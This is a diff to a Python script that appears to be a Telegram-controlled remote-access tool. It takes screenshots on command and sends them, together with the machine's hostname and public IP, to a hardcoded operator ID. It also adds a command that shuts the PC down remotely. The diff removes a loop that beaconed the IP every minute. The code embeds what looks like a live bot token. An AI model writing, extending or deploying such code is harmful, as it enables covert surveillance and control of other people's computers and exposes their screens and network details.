@@ -3,20 +3,25 @@ import pyautogui
 from io import BytesIO
 import socket
 import os
-import time
 import requests
-import subprocess
 import threading
 
 TOKEN = '8298701250:AAHfhWw3wk6Xw15UumisaB4avPyKDuid_SU'
 MY_ID = 7497410701
 bot = telebot.TeleBot(TOKEN)
 
-def get_ip():
+def get_info():
     try:
-        return requests.get('https://api.ipify.org', timeout=5).text
+        ip = requests.get('https://api.ipify.org', timeout=5).text
+        host = socket.gethostname()
+        return f"🖥 {host} | IP: {ip}"
     except:
-        return socket.gethostbyname(socket.gethostname())
+        return "🖥 Unknown PC"
+
+@bot.message_handler(commands=['ping'])
+def manual_ping(message):
+    if message.from_user.id == MY_ID:
+        bot.reply_to(message, f"✅ Online: {get_info()}")
 
 @bot.message_handler(commands=['screen'])
 def send_screen(message):
@@ -26,22 +31,14 @@ def send_screen(message):
             buf = BytesIO()
             screen.save(buf, format='PNG')
             buf.seek(0)
-            bot.send_photo(MY_ID, buf, caption=f"🖥 PC: {socket.gethostname()} ({get_ip()})")
+            bot.send_photo(MY_ID, buf, caption=get_info())
         except:
             pass
 
-def pinger():
-    while True:
-        try:
-            bot.send_message(MY_ID, f"PING_FROM_PC:{get_ip()}")
-            time.sleep(60)
-        except:
-            time.sleep(10)
+@bot.message_handler(commands=['off-confirm'])
+def shutdown_pc(message):
+    if message.from_user.id == MY_ID:
+        os.system("shutdown /s /t 1")
 
 if __name__ == "__main__":
-    threading.Thread(target=pinger, daemon=True).start()
-    while True:
-        try:
-            bot.polling(none_stop=True, interval=0, timeout=20)
-        except:
-            time.sleep(5)
+    bot.polling(none_stop=True)
